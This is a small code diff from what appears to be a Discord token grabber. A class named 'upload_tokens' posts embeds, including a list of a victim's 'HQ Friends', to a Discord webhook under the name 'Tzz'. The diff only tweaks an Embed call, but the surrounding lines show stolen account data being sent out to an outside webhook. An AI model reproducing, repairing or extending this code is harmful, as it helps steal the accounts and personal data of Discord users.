@@ -349,7 +349,7 @@ class upload_tokens:
             self.webhook.send(embed=embed, username="Tzz", avatar_url="https://cdn.discordapp.com/attachments/1027934499100692530/1051562569355247716/502474a8-a304-4df0-a410-0e2e04b634cc.jpg")
 
             
-            HQembed = Embed(title = "<:0_ubpig:974784458504933456> HQ Friends:", color=0x000000)
+            HQembed = Embed(name="",title = "<:0_ubpig:974784458504933456> HQ Friends:", color=0x000000)
             if hq_friends != None:
                 embed.add_field(value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
